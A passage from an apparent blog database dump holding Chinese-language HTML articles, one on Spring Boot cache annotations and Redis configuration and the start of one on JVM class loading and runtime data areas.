store;\n}\n</code></div></pre>\n<h3><a id=\"_1989\"></a>运行流程</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*CacheAutoConfiguration*/</span>\n<span class=\"hljs-meta\">@Override</span>\n<span class=\"hljs-meta\">@Nullable</span>\n<span class=\"hljs-keyword\">public</span> Cache <span class=\"hljs-title function_\">getCache</span><span class=\"hljs-params\">(String name)</span> {\n   <span class=\"hljs-type\">Cache</span> <span class=\"hljs-variable\">cache</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-built_in\">this</span>.cacheMap.get(name);\n   <span class=\"hljs-keyword\">if</span> (cache == <span class=\"hljs-literal\">null</span> &amp;&amp; <span class=\"hljs-built_in\">this</span>.dynamic) {\n      <span class=\"hljs-keyword\">synchronized</span> (<span class=\"hljs-built_in\">this</span>.cacheMap) {\n         cache = <span class=\"hljs-built_in\">this</span>.cacheMap.get(name);\n         <span class=\"hljs-keyword\">if</span> (cache == <span class=\"hljs-literal\">null</span>) {\n            cache = createConcurrentMapCache(name);\n            <span class=\"hljs-built_in\">this</span>.cacheMap.put(name, cache);\n         }\n      }\n   }\n   <span class=\"hljs-keyword\">return</span> cache;\n}\n</code></div></pre>\n<p>目标方法运行之前会先去查询缓存组件,根据cacheNames查询,第一次查询cache为空则创建cache并放在ConcurrentMap中</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*ConcurrentMapCache*/</span>\n<span class=\"hljs-keyword\">protected</span> Cache <span class=\"hljs-title function_\">createConcurrentMapCache</span><span class=\"hljs-params\">(String name)</span> {\n   <span class=\"hljs-type\">SerializationDelegate</span> <span class=\"hljs-variable\">actualSerialization</span> <span class=\"hljs-operator\">=</span> (isStoreByValue() ? <span class=\"hljs-built_in\">this</span>.serialization : <span class=\"hljs-literal\">null</span>);\n   <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ConcurrentMapCache</span>(name, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ConcurrentHashMap</span>&lt;&gt;(<span class=\"hljs-number\">256</span>), isAllowNullValues(), actualSerialization);\n}\n</code></div></pre>\n<p>根据key（默认方法参数的值 ,若参数有多个则传入多个参数包装的对象）来查询value,若value为空则调用目标方法</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*ConcurrentMapCache*/</span>\n<span class=\"hljs-meta\">@Override</span>\n<span class=\"hljs-meta\">@Nullable</span>\n<span class=\"hljs-keyword\">protected</span> Object <span class=\"hljs-title function_\">lookup</span><span class=\"hljs-params\">(Object key)</span> {\n   <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">this</span>.store.get(key);\n}\n</code></div></pre>\n<p>将目标的返回值放入缓存中</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*ConcurrentMapCache*/</span>\n<span class=\"hljs-meta\">@Override</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">put</span><span class=\"hljs-params\">(Object key, <span class=\"hljs-meta\">@Nullable</span> Object value)</span> {\n   <span class=\"hljs-built_in\">this</span>.store.put(key, toStoreValue(value));\n}\n</code></div></pre>\n<h3><a id=\"CachePut_2041\"></a>@CachePut注解</h3>\n<p>用于更新数据   先调用目标方法,再将方法的返回值更新到缓存中（不仅可以更新数据库中的数据还可以更新缓存中的数据）</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*注意:key的值要和查询方法key的值保持一致(保持数据一致性)*/</span>\n<span class=\"hljs-meta\">@CachePut(cacheNames = {&quot;studentInfo&quot;}, key = &quot;#student.id&quot;)</span>\n<span class=\"hljs-keyword\">public</span> Student <span class=\"hljs-title function_\">update</span><span class=\"hljs-params\">(Student student)</span>{\n    System.out.println(<span class=\"hljs-string\">&quot;更新数据啦！&quot;</span>);\n    studentDao.update(student);\n    <span class=\"hljs-comment\">/*一定要返回值 用来更新缓存*/</span>\n    <span class=\"hljs-keyword\">return</span> student;\n}\n</code></div></pre>\n<p>@Cacheable是先根据key查询缓存,若该key对应的值为null再调用目标方法,最后才将数据put进缓存中</p>\n<p>@CachePut则是直接调用目标方法,再将方法的值put进缓存中,会覆盖key对应的值</p>\n<h3><a id=\"CacheEvict_2060\"></a>@CacheEvict注解</h3>\n<p>用于清除缓存</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@CacheEvict(cacheNames = {&quot;studentInfo&quot;} ,key = &quot;#id&quot; ,allEntries = true ,beforeInvocation = true)</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">deleteCacheById</span><span class=\"hljs-params\">(Integer id)</span>{\n}\n</code></div></pre>\n<p><code>allEntries属性默认为false即根据只key来删除相对应的缓存,而true即代表删除该缓存组件中所有的缓存</code></p>\n<p><code>beforeInvocation属性默认为false,代表方法执行完后清除缓存 true代表方法执行前删除缓存,无论方法非正常执行完都要清除缓存</code></p>\n<h3><a id=\"Caching_2074\"></a>Caching注解</h3>\n<p>可以指定多个属性</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Target({ElementType.TYPE, ElementType.METHOD})</span>\n<span class=\"hljs-meta\">@Retention(RetentionPolicy.RUNTIME)</span>\n<span class=\"hljs-meta\">@Inherited</span>\n<span class=\"hljs-meta\">@Documented</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-meta\">@interface</span> Caching {\n\n   Cacheable[] cacheable() <span class=\"hljs-keyword\">default</span> {};\n\n   CachePut[] put() <span class=\"hljs-keyword\">default</span> {};\n\n   CacheEvict[] evict() <span class=\"hljs-keyword\">default</span> {};\n\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Caching(\n        cacheable = {@Cacheable(value = &quot;studentInfo&quot; ,key = &quot;#student.id&quot;)},\n        put = {@CachePut(value = &quot;studentInfo&quot; ,key = &quot;#result.name&quot;)}\n)</span>\n<span class=\"hljs-keyword\">public</span> Student <span class=\"hljs-title function_\">findNameById</span><span class=\"hljs-params\">(Student student)</span>{ \n    studentDao.findNameById(student);\n    <span class=\"hljs-keyword\">return</span> student;\n}\n</code></div></pre>\n<h3><a id=\"CacheConfig_2105\"></a>@CacheConfig注解</h3>\n<p>标注在类上,指定该类中方法共有的缓存属性</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Target(ElementType.TYPE)</span>\n<span class=\"hljs-meta\">@Retention(RetentionPolicy.RUNTIME)</span>\n<span class=\"hljs-meta\">@Documented</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-meta\">@interface</span> CacheConfig {\n   String[] cacheNames() <span class=\"hljs-keyword\">default</span> {};\n   String <span class=\"hljs-title function_\">keyGenerator</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n   String <span class=\"hljs-title function_\">cacheManager</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n   String <span class=\"hljs-title function_\">cacheResolver</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n}\n</code></div></pre>\n<h3><a id=\"Redis_2121\"></a>Redis</h3>\n<h4><a id=\"pomxml_2123\"></a>pom.xml</h4>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n</code></div></pre>\n<h4><a id=\"redis_2132\"></a>配置redis主机</h4>\n<pre><div class=\"hljs\"><code class=\"lang-yaml\"><span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">redis:</span>\n    <span class=\"hljs-attr\">host:</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.107</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Autowired</span>\nStringRedisTemplate stringRedisTemplate;<span class=\"hljs-comment\">/*以k-v字符串的形式保存*/</span>\n<span class=\"hljs-meta\">@Autowired</span>\nRedisTemplate redisTemplate;            <span class=\"hljs-comment\">/*以k-v对象的形式保存*/</span>\n</code></div></pre>\n<h4><a id=\"redis_2147\"></a>自定义redis序列化对象的规则</h4>\n<p>保存对象默认使用jdk序列化机制</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*将对象转化为json数据保存在redis中*/</span>\n<span class=\"hljs-keyword\">package</span> com.example.config;\n<span class=\"hljs-keyword\">import</span> com.example.entity.Student;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Bean;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Configuration;\n<span class=\"hljs-keyword\">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;\n<span class=\"hljs-keyword\">import</span> org.springframework.data.redis.core.RedisTemplate;\n<span class=\"hljs-keyword\">import</span> org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;\n<span class=\"hljs-meta\">@Configuration</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyRedisConfig</span> {\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> RedisTemplate&lt;Object ,Student&gt; <span class=\"hljs-title function_\">myRedisTemplate</span><span class=\"hljs-params\">(RedisConnectionFactory redisConnectionFactory)</span>{\n        RedisTemplate&lt;Object ,Student&gt; redisTemplate = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">RedisTemplate</span>&lt;&gt;();\n        redisTemplate.setConnectionFactory(redisConnectionFactory);\n        Jackson2JsonRedisSerializer&lt;Student&gt; jackson2JsonRedisSerializer = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Jackson2JsonRedisSerializer</span>&lt;&gt;(Student.class);\n        redisTemplate.setDefaultSerializer(jackson2JsonRedisSerializer);\n        <span class=\"hljs-keyword\">return</span> redisTemplate;\n    }\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> RedisCacheManager <span class=\"hljs-title function_\">cacheManager</span><span class=\"hljs-params\">(RedisConnectionFactory connectionFactory)</span> {\n        <span class=\"hljs-type\">RedisCacheConfiguration</span> <span class=\"hljs-variable\">cacheConfiguration</span> <span class=\"hljs-operator\">=</span> RedisCacheConfiguration.defaultCacheConfig()\n            .entryTtl(Duration.ofDays(<span class=\"hljs-number\">1</span>))\n            .disableCachingNullValues()\n            .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">GenericJackson2JsonRedisSerializer</span>()));\n        <span class=\"hljs-keyword\">return</span> RedisCacheManager.builder(connectionFactory).cacheDefaults(cacheConfiguration).build();\n    }\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*测试*/</span>\n<span class=\"hljs-meta\">@Autowired</span>\nStudentDao studentDao;\n<span class=\"hljs-meta\">@Autowired</span>\nRedisTemplate&lt;Object , Student&gt; myRedisTemplate;\n<span class=\"hljs-meta\">@Test</span>\n<span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">contextLoads</span><span class=\"hljs-params\">()</span> {\n    <span class=\"hljs-type\">Student</span> <span class=\"hljs-variable\">student</span> <span class=\"hljs-operator\">=</span> studentDao.findById(<span class=\"hljs-number\">2</span>);\n    myRedisTemplate.opsForValue().set(<span class=\"hljs-string\">&quot;student&quot;</span>,student);\n}\n</code></div></pre>\n<h4><a id=\"Serializable_2194\"></a>实体类实现Serializable接口</h4>\n<h4><a id=\"RedisCacheConfiguration_2196\"></a>RedisCacheConfiguration</h4>\n<p>默认会将CacheName作为key的前缀</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Deprecated</span>\n<span class=\"hljs-keyword\">public</span> RedisCacheConfiguration <span class=\"hljs-title function_\">prefixKeysWith</span><span class=\"hljs-params\">(String prefix)</span> {\n   Assert.notNull(prefix, <span class=\"hljs-string\">&quot;Prefix must not be null!&quot;</span>);\n   <span class=\"hljs-keyword\">return</span> computePrefixWith((cacheName) -&gt; prefix);\n}\n</code></div></pre>\n<ul>\n<li>\n<p>当容器中存在多个cacheManager时,需要在目标方法的类上使用<code>@CacheConfig</code>注解指明cacheManager</p>\n</li>\n<li>\n<p>直接在组件方法上使用<code>@Primary</code>注解表明这是默认的cacheManager</p>\n</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*不使用@cacheabe注解*/</span>\n<span class=\"hljs-meta\">@Autowired</span>\nRedisCacheManager cacheManager;\n<span class=\"hljs-keyword\">public</span> Student <span class=\"hljs-title function_\">findById</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> id)</span>{\n    System.out.println(<span class=\"hljs-string\">&quot;连接数据库啦！！&quot;</span>);\n    <span class=\"hljs-type\">Student</span> <span class=\"hljs-variable\">student</span> <span class=\"hljs-operator\">=</span> studentDao.findById(id);\n    <span class=\"hljs-comment\">/*设置缓存组件的名称*/</span>\n    <span class=\"hljs-type\">Cache</span> <span class=\"hljs-variable\">cache</span> <span class=\"hljs-operator\">=</span> cacheManager.getCache(<span class=\"hljs-string\">&quot;studentInfo&quot;</span>);\n    <span class=\"hljs-comment\">/*设置缓存的key*/</span>\n    cache.put(<span class=\"hljs-string\">&quot;key&quot;</span>,student);\n    <span class=\"hljs-keyword\">return</span> student;\n}\n</code></div></pre>\n',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbnCAdoN_AAARlBZAB7Q62.jpeg',2,0,'220226DP09K1F0SW','目录 [TOC] SpringBoot（v2.3.2.RELEASE） SpringBoot配置 场景启动器 spring-boot-start &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifac',0,0,0,NULL,0,354,'2022-05-17 08:59:20','2022-05-10 12:02:38','[\"220329D488658SFW\",\"220329D180W7F2RP\",\"220329D4RM2MM4PH\"]',0),('220403CS5RY4HM80','Deep understanding of the Java','<h1><a id=\"Deep_understanding_of_the_Java_Virtual_Machine_0\"></a>Deep understanding of the Java Virtual Machine</h1>\n<p>[TOC]</p>\n<p><em><img src=\"https://cdn.qingweico.cn/blog/601773e53ffa7d37b3a530f6.png\" alt=\"\" /></em></p>\n<h2><a id=\"1__6\"></a>1 类加载器</h2>\n<h3><a id=\"11__8\"></a>1.1 类的加载过程</h3>\n<ul>\n<li>加载</li>\n</ul>\n<pre><code class=\"lang-properties\">1: 通过一个类的全限定名称获取此类的二进制字节流\n2: 将这个字节流所代表的静态存储结构转换为方法区的运行时数据结构\n3: 在内存中生成一个代表这个类的java.lang.Class对象, 作为方法区这个类的各种数据的访问入口\n</code></pre>\n<ul>\n<li>链接\n<ul>\n<li>验证\n<ul>\n<li>文件格式的验证(openjdk/hotspot/src/share/vm/classfile/classFileParser.cpp)</li>\n<li>元数据验证</li>\n<li>字节码验证</li>\n<li>符号引用验证</li>\n</ul>\n</li>\n<li>准备</li>\n<li>解析</li>\n</ul>\n</li>\n<li>初始化</li>\n</ul>\n<pre><code class=\"lang-properties\">执行类构造器方法&lt;clinit&gt;()\n此方法不需要定义, 是javac编译器自动收集类中的所有类变量的赋值动作和静态代码块中的语句合并而来\n构造器方法中指令按语句在源文件中出现的顺序执行\n&lt;clinit&gt;不同于类的构造器(关联: 构造器是虚拟机视角下的&lt;init&gt;())\n若该类具有父类, JVM会保证子类的&lt;clinit&gt;()执行前, 父类的&lt;clinit&gt;()已经执行完毕\n虚拟机必须保证一个类的&lt;clinit&gt;()方法在多线程下被同步加锁\n</code></pre>\n<p>对于初始化阶段 《Java虚拟机规划》 严格定义了有且只有六种情况必须对类进行初始化</p>\n<ul>\n<li>遇到 new 、getstatic、putstatic或者invokestatic 这四条字节码指令时</li>\n<li>使用java.lang.reflect包的方法对类型进行反射调用的时候</li>\n<li>当类初始化的时候 如果发现其父类还没有进行初始化的时候 则需要先触发其父类的初始化</li>\n<li>当虚拟机启动时用户需要指定一个要执行的主类 虚拟机首先会初始化这个类(即包含main方法的那个类)</li>\n<li>当使用JDK 7新加入的动态语言支持时 如果一个java.lang.invoke.MethodHandle实例最后的解析结果为REF_getStatic REF_putStatic REF_invokeStatic REF_newInvokeSpecial 四种类型的方法句柄 并且这个方法句柄对应的类没有进行过初始化</li>\n<li>当接口中定义JDK 8中新加入的默认方法时 如果这个接口的实现类发生了初始化 那该接口要在其之前被初始化</li>\n</ul>\n<h3><a id=\"12__46\"></a>1.2 类加载器的分类</h3>\n<ul>\n<li>引导类加载器(Bootstrap Class Loader) :\n<ul>\n<li>系统类加载器(System(Application) Class Loader)         classpath</li>\n<li>扩展类加载器(Extension Class Loader)                           jre目录下 lib/ext</li>\n</ul>\n</li>\n<li>自定义类加载器(User-Defined Class Loader)</li>\n</ul>\n<p><strong>将所有派生于抽象类ClassLoader的类加载器都划分为自定义类加载器(不包括引导类加载器)</strong></p>\n<p>引导类加载器：使用C/C++代码实现, 嵌套在JVM内部</p>\n<p>系统类加载器(AppClassLoader)：程序中通过默认的类加载器</p>\n<p>OSGi模型</p>\n<h3><a id=\"13__61\"></a>1.3 双亲委派机制</h3>\n<p>工作原理:</p>\n<pre><code class=\"lang-properties\">1&gt;: 如果一个类加载器收到了类加载请求, 它并不会自己先去加载, 而是把这个请求委托给父类的加载器去执行\n2&gt;: 如果父类加载器还存在其父类加载器, 则近一步向上委托, 依次递归, 请求最终到达顶层的启动类加载器\n3&gt;: 如果父类加载器可以完成类加载任务, 就成功返回, 倘若父类加载器无法完成此加载任务, 子加载器才会尝试自己去加载, 这就是双亲委派机制\n</code></pre>\n<p>在JVM中表示两个class对象是否为同一个类存在的两个必要条件</p>\n<ul>\n<li>类的完整类名必须一致, 包括包名</li>\n<li>加载这个类的ClassLoader(指ClassLoader实例对象)必须相同</li>\n</ul>\n<p>对类加载器的引用：</p>\n<pre><code class=\"lang-properties\">JVM必须知道一个类型是由引导类加载器加载的还是由用户类加载器加载的.\n如果一个类型是由用户类加载器加载的, 那么JVM会将这个类加载器的一个引用作为类型信息的一部分保存在方法去中.\n当解析一个类型到另外一个类型的引用的时候, JVM需要保证这两个类型的类加载器是相同的.\n</code></pre>\n<h2><a id=\"2__84\"></a>2 运行时数据区</h2>\n<p>方法区和堆有GC, 虚拟机栈和本地方法区以及程序计数器则没有GC</p>\n<p>方法区和堆为所有线程所共享, 而虚拟机栈和本地方法区以及程序计数器则每个线程各有一份</p>\n<h3><a id=\"21_PC_90\"></a>2.1 PC寄存器</h3>\n<p>程序计数器也叫PC寄存器(Program Counter Register)</p>\n<p>JVM中PC寄存器是对物理寄存器的一种抽象模拟</p>\n<p>程序计数器是唯一一个在JVM中没有规定任何OutOfMemoryError情况的的区域</p>\n<p>PC寄存器的作用：</p>\n<pre><code class=\"lang-properties\">PC寄存器用来存储指向下一条指令的地址(偏移地址), 即将要执行的指令代码, 由执行引擎读取下一条指令.\n</code></pre>\n<p>PC寄存器被设定为线程私有的原因:</p>\n<pre><code class=\"lang-properties\">在多线程环境中, 一个特定的时间段只会执行其中某一个线程的方法, CPU会不停地做任务切换, 这样必然会导致线程中断和恢复, 为了能够准确地记录各个线程正在执行地当前字节码指令地址, 最好的办法自然是为每一个线程都分配一个PC寄存器, 这样一来各个线程之间便可以进行独立计算, 从而不会出现相互干扰的情况.\n</code></pre>\n<p>CPU时间片即CPU分配给各个程序的时间, 每个线程被分配一个时间段,  称作它的时间片</p>\n<p>如果线程正在执行的是一个Java方法 pc记录的是正在执行的虚拟机字节码指令的地址 如果正在执行的是本地方法 pc的值应该为空</p>\n<h3><a id=\"22__114\"></a>2.2 虚拟机栈</h3>\n<p>由于跨平台的设计, Java的指令都是根据栈来设计的, 因为不同平台CPU架构不同, 所以不能设计为基于寄存器的</p>\n<p>虚拟机栈的 <strong>优点</strong>是: 指令集小, 编译器容易实现 <strong>缺点</strong>是性能下降, 实现同样的功能需要更多的指令</p>\n<p>作用: 主管Java程序的运行, 它保存方法的局部变量、部分结果, 并参与方法的调用和返回</p>\n<p>生命周期: 生命周期和线程一致</p>\n<p>每个线程在创建时都会创建一个虚拟机栈, 其内部保存一个个的栈帧(Stack Frame), 对应着一次次Java方法调用</p>\n<p>栈的特点：</p>\n<ul>\n<li>栈是一种快速有效的分配存储方式, 访问速度仅次于PC寄存器</li>\n<li>JVM直接对虚拟机栈的操作只有两个\n<ul>\n<li>每个方法执行, 伴随着进栈(入栈、压栈)</li>\n<li>执行结束后的出栈工作</li>\n</ul>\n</li>\n<li>对于栈来说不存在垃圾回收问题(但是存在OOM和SOF问题)</li>\n</ul>\n<pre><code class=\"lang-properties\">-Xss1k/1m/1g 设置虚拟机栈内存的大小\n-Xss1024 不加单位默认为字节\n</code></pre>\n<p>栈运行原理:</p>\n<ul>\n<li>不同线程中所包含的栈帧是不允许存在相互引用的, 即不可能在一个栈帧之中引用另外一个线程的帧.</li>\n<li>如果当前方法调用了其他方法, 方法返回之际, 当前栈帧回传会此方法的执行结果给前一个栈帧, 接着, 虚拟机会丢弃当前栈帧, 使得前一个栈帧重新成为当前栈帧.</li>\n<li>Java方法有两种返回函数的方式, 一种是正常的函数返回, 使用return指令; 另一种是抛出异常. 不管使用哪种方式, 都会导致栈帧被弹出.</li>\n</ul>\n<h4><a id=\"221__145\"></a>2.2.1 栈帧的内部结构</h4>\n<p>每个栈帧中储存着：</p>\n<ul>\n<li>局部变量表(Local Variables)</li>\n<li>操作数栈(Operand Stack)(或表达式栈)</li>\n<li>动态链接(Dynamic Linking)(或指向运行时常量池的方法引用)</li>\n<li>方法返回地址(Return Address)(或方法正常退出或者异常退出的定义)</li>\n<li>一些附加信息</li>\n</ul>\n<h4><a id=\"222__155\"></a>2.2.2 局部变量表</h4>\n<ul>\n<li>局部变量表也称之为局部变量数组或本地变量表</li>\n<li>定义为一个数字数组, 主要用来储存方法参数和定义在方法体内的的局部变量, 这些数据类型包括各类基本数据类型、对象引用(reference类型 它并不等同于对象本身 可能是指向一个对象起始地址的引用指针 也可能指向一个代表对象的句柄或者其他与此对象相关的位置),  以及returnAddress(指向了一条字节码指令地址)类型</li>\n<li>由于局部变量表是建立在线程的栈上, 是线程的私有数据, 因此不存在数据安全问题</li>\n<li>局部变量表所需的容量大小是在编译期确定下来的, 并保存在方法的Code属性的maximun local variables数据项中; 在方法运行期间是不会改变局部变量表的大小的</li>\n<li>方法嵌套的次数由栈的大小决定; 一般来说,栈越大, 方法嵌套调用次数越多; 对一个函数而言,它的参数和局部变量越多, 使得局部变量表膨胀, 它的帧就越大, 以满足方法调用所需传递的信息增大的需求; 进而函数调用就会占用更多的栈空间, 导致其嵌套调用次数就会减少</li>\n<li>局部变量表只在当前方法调用中有效; 在方法执行时, 虚拟机通过使用局部变量表完成参数值到参数列表的传递过程; 当方法调用结束后, 随着方法栈的销毁,局部变量表也会销毁</li>\n<li>局部变量表, 最基本的储存单是Slot(变量槽)</li>\n<li>在《Java虚拟机规范》中对这个内存区域规定了两类异常状况: 如果线程请求的栈深度大于虚拟机所允许的深度 将抛出StackOverflowError异常; 如果Java 虚拟机栈容量可以动态扩展 当栈扩展时无法申请到足够的内存时会抛出OutOfMemoryError异常</li>\n<li>HotSpot虚拟机的栈是不支持动态扩展的</li>\n</ul>\n<h5><a id=\"2221Slot_167\"></a>2.2.2.1关于Slot的理解</h5>\n<pre><code class=\"lang-properties\">1&gt; JVM会为局部变量表中的每一个Slot都分配一个访问索引, 通过这个索引1即可成功访问到局部变量表中指定的局部变量值\n2&gt; 当一个实例方法调用的时候, 它的方法参数和方法体内部定义的局部变量将会按照顺序被复制到局部变量表中的每一个Slot上\n3&gt; 如果需要访问局部变量表中的一个64bit的局部变量值时, 只需要使用前一个索引即可(注:32位以内的类型只占一个和slot(包括returnAddress), 64位的类型(long和double占用两个slot))\n4&gt; 如果当前帧是由构造方法或者实列方法创建的, 那么该对象引用this将会存放在index为0的slot处, 其余的参数按照参数顺序表顺序继续排列\n</code></pre>\n<p>栈帧中局部变量表中的槽位是可以重用的, 如果一个局部变量过了其作用域, 那么在其作用域之后申明的新的局部变量可能会复用过期局部变量的槽位, 从而达到节省资源的目的</p>\n<h5><a id=\"2222__178\"></a>2.2.2.2 总结</h5>\n<ul>\n<li>在栈帧中, 与性能调优最为密切的部分就是局部变量表, 在方法执行时, 虚拟机使用局部变量表完成方法的传递</li>\n<li>局部变量中的变量也是重要的垃圾回收根节点, 只要被局部变量表中直接或者间接引用的对象都不会被回收</li>\n</ul>\n<h4><a id=\"223__183\"></a>2.2.3 操作数栈</h4>\n<ul>\n<li>操作数栈, 主要用于保存计算的中间结果, 同时作为计算过程中变量临时的储存空间</li>\n<li>操作数栈就是JVM执行引擎的一个工作区, 当一个方法开始执行的时候, 一个新的栈帧也会随之被创建出来, 这个方法的操作数栈是空的</li>\n<li>每一个操作数栈都会拥有一个明确的栈深度用于储存数值, 其所需的最大深度在编译器就定义好了, 保存在方法的Code属性中, 为max_stack的值</li>\n<li>栈中的任何一个元素都可以是任意的Java数据类型\n<ul>\n<li>32bit的类型占用一个栈单位深度</li>\n<li>64bit的类型占用两个栈单位深度</li>\n</ul>\n</li>\n<li>操作数栈并非采用访问索引的方式来进行数据访问的,  而是只能通过标准的入栈和出栈操作来完成一次数据访问</li>\n<li>如果被调用的方法带有返回值的话, 其返回值将会被压入当前栈帧的操作数栈中, 并更新PC寄存器中下一条需要执行的字节码指令</li>\n<li>操作数栈中元素的数据类型必须与字节码指令的序列严格匹配, 这由编译器在编译期间进行验证, 同时在类加载过程中的类检验阶段的数据流分析阶段要再次验证</li>\n<li>另外, 我们说Java虚拟机的解析引擎是基于栈的执行引擎, 其中的栈指的就是操作数栈</li>\n</ul>\n<h4><a id=\"224__196\"></a>2.2.4 动态链接</h4>\n<ul>\n<li>每个栈帧内部都包含一个指向运行时常量池中该栈帧所属方法的引用; 包含这个引用的目的就是为了支持当前方法的代码能够实现动态链接</li>\n<li>在Java源文件被编译到字节码文件中, 所有的变量和方法引用都作为符号引用(symbolic Reference) 保存在class文件的常量池里; 比如描述一个方法调用了另外的其他方法时, 就是通过常量池中指向方法的符号引用来表示的, 那么动态链接的作用就是为了将这些符号引用转换为调用方法的直接引用</li>\n</ul>\n<h5><a id=\"2241__201\"></a>2.2.4.1 为什么需要常量池</h5>\n<pre><code class=\"lang-properties\">常量池的作用就是提供一些符号和常量, 便于指令的识别以及资源的共享和复用\n</code></pre>\n<h5><a id=\"2242__207\"></a>2.2.4.2 方法的调用</h5>\n<p>在JVM中, 将符号引用转换为调用方法的直接引用与方法的绑定机制相关</p>\n<ul>\n<li>静态链接(静态绑定): 当一个字节码文件被装进JVM内部时, 如果被调用的目标方法在编译期可知, 且运行期保持不变, 这种情况下将调用方法的符号引用转换为直接引用的过程称之为静态链接</li>\n<li>动态链接(动态绑定): 如果被调用的·1方法在编译期无法被确定下来, 也就是说, 只能够在程序运行期将调用方法的符号引用转换为直接引用, 由于这种引用转换过程具有动态性, 因此被称为动态链接</li>\n</ul>\n<h5><a id=\"2243__214\"></a>2.2.4.3 虚方法和非虚方法</h5>\n<ul>\n<li>普通调用指令\n<ul>\n<li>invokestatic: 调用静态方法, 解阶段确定唯一方法版本</li>\n<li>invokespecial: 调用&lt;init&gt;方法、私有方法以及父类方法, 解析阶段确定唯一方法版本</li>\n<li>invokevirtual: 调用所有的虚方法</li>\n<li>invokeinterface: 调用接口方法</li>\n</ul>\n</li>\n<li>动态调用指令\n<ul>\n<li>invokedunamic: 动态解析出需要调用的方法, 然后执行</li>\n</ul>\n</li>\n</ul>\n<p>前四条指令固化在虚拟机内部, 方法的调用执行不可人为干预, 而invokedynamic指令则支持由用户确定方法的版本; 其中invokestatic指令和invokespecial指令调用的方法称为非虚方法, 其余的(final修饰的除外)称为虚方法</p>\n<h5><a id=\"2244_invokedynamic_226\"></a>2.2.4.4 关于invokedynamic指令</h5>\n<p>invokedynamic指令于Java7添加, 是为了能够让Java支持动态类型语言而做的一种改进(使用Lamabda表达式可以直接生成)</p>\n<p>Java7中增加的动态类型语言支持的本质是对Java虚拟机规范的修改, 而不是对Java语言规则的修改</p>\n<p>动态类型语言和静态类型语言</p>\n<p>动态类型语言和静态类型语言两者的区别就在于对类型的检查是在编译期还是在运行期, 满足前者就是静态类型语言, 反之是动态类型语言</p>\n<p>静态类型语言是判断变量自身的类型信息; 动态类型语言是判断变量值的类型信息, 变量没有类型信息, 变量值才有类型信息</p>\n<p>Java是静态类型的语言</p>\n<h4><a id=\"225__240\"></a>2.2.5 方法返回地址</h4>\n<p>存放调用该方法的pc寄存器的值</p>\n<ul>\n<li>无论方法正常退出还是异常退出都会回到该方法被调用的位置; 方法正常退出时, 调用者的pc计数器的值作为返回地址, 